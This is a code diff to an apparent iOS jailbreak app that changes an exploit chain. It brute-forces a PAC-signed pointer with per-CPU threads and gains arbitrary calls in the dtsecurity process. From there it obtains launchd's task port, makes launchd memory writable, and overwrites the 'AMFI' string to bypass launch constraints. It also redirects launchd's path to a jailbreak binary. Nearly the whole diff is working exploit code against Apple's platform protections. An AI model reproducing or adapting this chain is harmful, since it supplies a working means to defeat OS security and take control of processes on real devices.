@@ -11,6 +11,12 @@
 #import <sys/sysctl.h>
 #include <sys/utsname.h>
 
+extern _Atomic bool global_found;
+extern _Atomic uint64_t global_result_ptr;
+extern _Atomic uint32_t global_result_diversifier;
+
+extern mach_port_t setup_exception_server_with_id(int thread_id);
+
 #include <Security/SecKey.h>
 #include <Security/Security.h>
 typedef struct CF_BRIDGED_TYPE(id) __SecCode const* SecStaticCodeRef; /* code on disk */
@@ -47,8 +53,8 @@ NSDictionary *getLaunchdStringOffsets(void) {
 
 
 @interface ViewController ()
-@property(nonatomic) mach_port_t exceptionPort;
-@property(nonatomic) mach_port_t fakeBootstrapPort;
+// @property(nonatomic) mach_port_t exceptionPort;
+// @property(nonatomic) mach_port_t fakeBootstrapPort;
 @end
 
 BOOL gTweakEnabled=YES;
@@ -87,54 +93,60 @@ BOOL gTweakEnabled=YES;
             NSLog(@"Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
         }
     }
-    
-    self.exceptionPort = setup_exception_server();
-    self.fakeBootstrapPort = setup_fake_bootstrap_server();
+    int mib[2] = {CTL_HW, HW_NCPU};
+    int cpu_count = 1;
+    size_t len = sizeof(cpu_count);
+    sysctl(mib, 2, &cpu_count, &len, NULL, 0);
+    if (cpu_count < 1) cpu_count = 1;
+    for (int i = 0; i < cpu_count; i++) {
+      launchTestWithThread(@"dtsecurity", i);
+    }
+    for (int i = 0; i < cpu_count; i++) {
+      setup_exception_server_with_id(i);
+      setup_fake_bootstrap_server_with_id(i);
+    }
+
+
 
 }
-void testButtonTapped() {
-  launchTest(@"dtsecurity");
-  NSLog(@"launch dtsecurity");
-}
+// void testButtonTapped() {
+//   launchTest(@"dtsecurity");
+//   NSLog(@"launch dtsecurity");
+// }
+
 void arbCallButtonTapped() {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
 
         kern_return_t kr;
+
+        int mib[2] = {CTL_HW, HW_NCPU};
+        int cpu_count = 1;
+        size_t len = sizeof(cpu_count);
+        sysctl(mib, 2, &cpu_count, &len, NULL, 0);
+        if (cpu_count < 1) cpu_count = 1;
+
+        NSLog(@"init bruteforce %d threads\n", cpu_count);
+
         
-        // Create a region which holds temp data (should we use stack instead?)
+        force_crash(); 
+        while (!global_found) {
+            usleep(50000);
+        }
+
+        NSLog(@"pac ret ptr=0x%llx, div=0x%x\n", global_result_ptr, global_result_diversifier);
+
         vm_size_t page_size = getpagesize();
         vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         if (!map) {
-            NSLog(@"Failed to call mmap. Please try resetting pointer and try again\n");
+            NSLog(@"Failed to call mmap. Using found PAC directly\n");
             return;
         }
-        NSLog(@"Mapped memory at 0x%lx\n", map);
-        
-        // Test mkdir
-//        RemoteWriteString(map, "/tmp/.it_works");
-//        RemoteArbCall(mkdir, map, 0700);
-        
-        // Get my task port
+
         mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
-//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
-//        if (kr != KERN_SUCCESS) {
-//            NSLog(@"Failed to get my task port\n");
-//            return;
-//        }
-//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
-        // Map the page we allocated in dtsecurity to this process
-//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
-//        if (kr != KERN_SUCCESS) {
-//            NSLog(@"Failed to create dtsecurity<->haxx shared mapping\n");
-//            return;
-//        }
-//        vm_address_t local_map = RemoteRead64(map);
-//        NSLog(@"Created shared mapping: 0x%lx\n", local_map);
-//        NSLog(@"read: 0x%llx\n", *(uint64_t *)local_map);
-        
+
         // Get dtsecurity dyld base for blr x19
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
+        kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
         if (kr != KERN_SUCCESS) {
             NSLog(@"task_info failed\n");
             return;
@@ -143,21 +155,20 @@ void arbCallButtonTapped() {
         vm_address_t remote_dyld_base;
         do {
             remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
-            // FIXME: why do I have to sleep a bit for dyld base to be available?
             usleep(100000);
         } while (remote_dyld_base == 0);
         NSLog(@"dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
-        
+
         // Get launchd task port
         kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
         if (kr != KERN_SUCCESS) {
             NSLog(@"Failed to get launchd task port\n");
             return;
         }
-        
+
         mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
         NSLog(@"Got launchd task port: %d\n", launchd_task);
-        
+
         // Get remote dyld base
         RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
@@ -166,24 +177,20 @@ void arbCallButtonTapped() {
             return;
         }
         remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
-        NSLog(@"launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
-        
-        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
+
         kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
             NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
             return;
         }
         uint32_t infoArrayCount = RemoteRead32(map);
-        NSLog(@"launchd infoArrayCount: %u\n", infoArrayCount);
-        
-        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
+
         kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
         if (kr != KERN_SUCCESS) {
             NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
             return;
         }
-        
+
         // Enumerate images to find launchd base
         vm_address_t launchd_base = 0;
         vm_address_t infoArray = RemoteRead64(map);
@@ -191,64 +198,51 @@ void arbCallButtonTapped() {
             kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
             uint64_t base = RemoteRead64(map);
             if (base % page_size) {
-                // skip unaligned entries, as they are likely in dsc
                 continue;
             }
-            NSLog(@"Image[%d] = 0x%llx\n", i, base);
-            // read magic, cputype, cpusubtype, filetype
             kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
             uint64_t magic = RemoteRead32(map);
             if (magic != MH_MAGIC_64) {
-                NSLog(@"not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                 continue;
             }
             uint32_t filetype = RemoteRead32(map + 12);
             if (filetype == MH_EXECUTE) {
-                NSLog(@"found launchd executable at 0x%llx\n", base);
                 launchd_base = base;
                 break;
             }
         }
-        
-        // Reprotect rw
-        // minimum page = 0x5f000;
+
+        // Reprotect and patch
         vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
         vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
-        
-        NSLog(@"reprotecting 0x%lx\n", launchd_base + 0x5f000);
-        RemoteChangeLR(0xFFFFFF00); // fix autibsp
-        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+
+        NSLog(@"reprotecting 0x%lx\n", launchd_base + launchd_str_off);
+        RemoteChangeLR(0xFFFFFF00);
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + launchd_str_off), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
         if (kr != KERN_SUCCESS) {
             NSLog(@"vm_protect failed: kr = %s\n", mach_error_string(kr));
             sleep(5);
             return;
         }
-
-        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
-        // Bypass panic by launch constraints
-        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
-
-        // Patch string `AMFI`
-        
+       // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
+       // Bypass panic by launch constraints
+       // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
         const char *newStr = "AAAA\x00";
         RemoteWriteString(map, newStr);
-        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        RemoteChangeLR(0xFFFFFF00);
         kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
         if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_write failed\n");
+            NSLog(@"vm_write amfi string failed\n");
             sleep(5);
             return;
         }
-        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);
 
-        // Overwrite /sbin/launchd string to jbroot("/sbin/launchd")
         const char *newPath = jbroot(@"/basebin/sbin/launchd").UTF8String;
-        // check: is jbroot(/sbin/launchd) needed or can we just prefix everything w /basebin/?
         RemoteWriteString(map, newPath);
-        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        RemoteChangeLR(0xFFFFFF00);
         kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
         if (kr != KERN_SUCCESS) {
-            NSLog(@"vm_write failed\n");
+            NSLog(@"vm_write launchd string failed\n");
             sleep(5);
             return;
         }
